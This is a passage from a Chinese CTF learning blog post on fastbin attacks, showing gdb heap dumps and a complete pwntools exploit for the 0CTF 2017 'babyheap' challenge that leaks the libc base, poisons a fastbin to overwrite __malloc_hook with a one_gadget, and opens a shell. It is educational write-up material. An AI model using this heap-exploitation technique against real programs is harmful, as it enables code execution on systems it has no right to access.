+0x7f2a8a09eb40 <main_arena+32>: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7f2a8a09eb50 <main_arena+48>: 0x00000000  0x00000000  0x00000000  0x00000000
+</code></pre>
+<p>   malloc 时还需要再次绕过检测，我 malloc(0x60) 也就是 0x70 大小的 chunk</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">gdb-peda$ x/32xw (long long)(&main_arena)-0x40+0xd
+0x7f2a8a09eaed <_IO_wide_data_0+301>:   0x60000000  0x2a8a09d2  0x0000007f  0x00000000
+0x7f2a8a09eafd: 0x20000000  0x2a89d5fe  0x0000007f  0x2a89d5fa
+0x7f2a8a09eb0d <__realloc_hook+5>:  0x0000007f  0x00000000  0x00000000  0x00000000
+0x7f2a8a09eb1d: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7f2a8a09eb2d <main_arena+13>: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7f2a8a09eb3d <main_arena+29>: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7f2a8a09eb4d <main_arena+45>: 0x00000000  0x00000000  0x00000000  0x00000000
+0x7f2a8a09eb5d <main_arena+61>: 0x00000000  0x00000000  0x00000000  0x00000000
+</code></pre>
+<p>  可以发现在 0x7f2a8a09eaed 处构造块可以绕过检测（因为 7f 满足 0x70 大小），可以计算 0x7f2a8a09eaed 距离 libc 基址的偏移为 0x3c4aed</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">allocate(0x60)
+free(4)
+payload = p64(libc_base+0x3c4aed)
+fill(2, payload)
+</code></pre>
+<p>  首先把 chunk 4 malloc 回来，这次 malloc 的大小在 fastbin 之内，然后把 chunk 4 的内容改为我们下一个要构造块的地址（chunk 4 已经被 free 掉，所以无法用 fill(4) 写入，由于我们刚刚把 chunk 2 的 fd 指针改为 chunk 4 的地址，所以第一次 malloc(0x10) 的时候是分配的原来 chunk 2 的块给 index 1，第二次 malloc(0x10) 的时候就会分配 chunk 4 的块给 index 2，也就是说 index 2 与 index 4 的内容都是 chunk 4）</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">allocate(0x60)
+allocate(0x60)
+payload = p8(0)*3
+payload += p64(0)*2
+payload += p64(libc_base+0x4526a)
+fill(6, payload)
+allocate(200)
+</code></pre>
+<p>完整exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+import sys
+
+context.log_level = "debug"
+
+proc="./babyheap_0ctf_2017"
+
+def Allocate(size):
+    sh.recvuntil("Command: ")
+    sh.sendline("1")
+    sh.recvuntil("Size: ")
+    sh.sendline(str(size))
+
+def fill(index,content):
+    sh.recvuntil("Command: ")
+    sh.sendline("2")
+    sh.recvuntil("Index: ")
+    sh.sendline(str(index))
+    sh.recvuntil("Size: ")
+    sh.sendline(str(len(content)))
+    sh.recvuntil("Content: ")
+    sh.sendline(content)
+
+def free(index):
+    sh.recvuntil("Command: ")
+    sh.sendline("3")
+    sh.recvuntil("Index: ")
+    sh.sendline(str(index))
+
+def dump(index):
+    sh.recvuntil("Command: ")
+    sh.sendline("4")
+    sh.recvuntil("Index: ")
+    sh.sendline(str(index))    
+    sh.recvline()
+    return sh.recvline()
+
+def pwn(ip,port,debug):
+    global sh
+    if debug==1:
+        sh=process(proc)
+    else:
+        sh=remote(ip,port)
+
+    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x10)
+    Allocate(0x80)
+
+    free(1)
+    free(2)
+    payload = p64(0)*3
+    payload += p64(0x21)
+    payload += p64(0)*3
+    payload += p64(0x21)
+    payload += p8(0x80)
+    fill(0, payload)
+
+    payload = p64(0)*3
+    payload += p64(0x21)
+    fill(3, payload)
+
+    Allocate(0x10)
+    Allocate(0x10)
+
+    payload = p64(0)*3
+    payload += p64(0x91)
+    fill(3, payload)
+    Allocate(0x80)
+    free(4)
+
+    libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78
+    log.info("libc_base: "+hex(libc_base))
+
+    Allocate(0x60)
+    free(4)
+
+    payload = p64(libc_base+0x3c4aed)
+    fill(2, payload)
+
+    Allocate(0x60)
+    Allocate(0x60)
+
+    payload = p8(0)*3
+    payload += p64(0)*2
+    one_gadget=0x4526a
+    payload += p64(libc_base+one_gadget)
+    fill(6, payload)
+
+    Allocate(255)
+    sh.sendline("cat flag")
+    sh.interactive()
+
+if __name__=="__main__":
+    pwn("node3.buuoj.cn",25187,0)
+</code></pre>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://180CM55KG.github.io" class="b-link-green">F0und</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/03/25/ctf/pwn/fastbins/" class="b-link-green">fastbins attack 学习记录</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/03/25/ctf/pwn/fastbins/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="fastbins attack 学习记录">
+                        
+                        <span class="card-title">fastbins attack 学习记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">fastbins attack ——Fastbin Double Free0x00 前言本篇为学习记录所用
+0x10 漏洞原理利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/03/25/ctf/pwn/fmt/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="格式化字符串漏洞原理与利用思路">
+                        
+                        <span class="card-title">格式化字符串漏洞原理与利用思路</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">格式化字符串漏洞原理与利用思路0x00 前言参考师傅： https://www.anquanke.com/post/id/194458 64位格式化字符串漏洞修改got表利用详解
+以及：https://ctf-wiki.github.io/</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">48k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/180CM55KG/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1845477611@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1845477611" class="tooltipped" data-tooltip="QQ联系我: 1845477611" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
